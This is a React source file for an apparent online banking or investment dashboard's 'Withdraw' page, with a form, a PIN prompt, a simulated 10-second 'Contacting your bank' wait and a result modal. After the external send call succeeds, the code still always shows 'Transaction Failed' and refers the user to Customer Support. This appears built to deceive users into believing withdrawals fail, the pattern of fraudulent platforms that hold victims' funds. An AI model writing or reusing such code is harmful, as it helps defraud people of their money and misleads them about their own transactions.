import { createFileRoute } from "@tanstack/react-router";
import { useState } from "react";
import { DashboardShell } from "@/components/dashboard-shell";
import { useApp } from "@/context/app-context";
import { fmt } from "@/lib/format";
import { Loader2 } from "lucide-react";
import { PinPromptModal } from "@/components/pin-modal";
import { TxResultModal, ProcessingModal, type TxResult } from "@/components/tx-result-modal";

export const Route = createFileRoute("/withdraw")({ component: Withdraw });

function Withdraw() {
  const { user, externalSend } = useApp();
  const [recipient, setRecipient] = useState("");
  const [bank, setBank] = useState("");
  const [ownEmail, setOwnEmail] = useState("");
  const [amount, setAmount] = useState("");
  const [busy, setBusy] = useState(false);
  const [pinOpen, setPinOpen] = useState(false);
  const [processing, setProcessing] = useState(false);
  const [result, setResult] = useState<TxResult>({ open: false, status: "success" });
  if (!user) return null;
  const submit = (e: React.FormEvent) => {
    e.preventDefault();
    setPinOpen(true);
  };
  const runAfterPin = async () => {
    setPinOpen(false);
    setBusy(true);
    setProcessing(true);
    try {
      await new Promise((r) => setTimeout(r, 10_000));
      setProcessing(false);
      await externalSend(recipient, bank, ownEmail, Number(amount));
      setResult({
        open: true,
        status: "failure",
        title: "Transaction Failed",
        message: "This transaction could not be completed. Please contact Customer Support for assistance.",
      });
    } catch (err) {
      setProcessing(false);
      setResult({ open: true, status: "failure", title: "Withdrawal Failed", message: (err as Error).message });
    } finally { setBusy(false); }
  };
  return (
    <DashboardShell title="Withdraw">
      <div className="mx-auto max-w-md">
        <form onSubmit={submit} className="glass rounded-2xl p-5 space-y-4">
          <h2 className="text-xl font-bold">Withdraw to bank</h2>
          <p className="text-sm text-muted-foreground">Available: {fmt(user.balances.main)}</p>
          <input required placeholder="Recipient account / name" value={recipient} onChange={(e) => setRecipient(e.target.value)} className="w-full rounded-lg border border-input bg-background px-3 py-2 text-sm" />
          <input required placeholder="Bank name" value={bank} onChange={(e) => setBank(e.target.value)} className="w-full rounded-lg border border-input bg-background px-3 py-2 text-sm" />
          <input required type="email" placeholder="Your account email" value={ownEmail} onChange={(e) => setOwnEmail(e.target.value)} className="w-full rounded-lg border border-input bg-background px-3 py-2 text-sm" />
          <input required type="number" min="1" placeholder="Amount" value={amount} onChange={(e) => setAmount(e.target.value)} className="w-full rounded-lg border border-input bg-background px-3 py-2 text-sm" />
          <button disabled={busy} className="w-full rounded-xl gradient-primary py-3 font-medium text-primary-foreground disabled:opacity-60 flex items-center justify-center gap-2">
            {busy && <Loader2 className="h-4 w-4 animate-spin" />} {busy ? "Processing withdrawal…" : "Request withdrawal"}
          </button>
        </form>
      </div>
      <PinPromptModal open={pinOpen} onClose={() => setPinOpen(false)} onSuccess={runAfterPin} />
      <ProcessingModal open={processing} title="Processing withdrawal…" subtitle="Contacting your bank" />
      <TxResultModal result={result} onClose={() => setResult({ ...result, open: false })} />
    </DashboardShell>
  );
}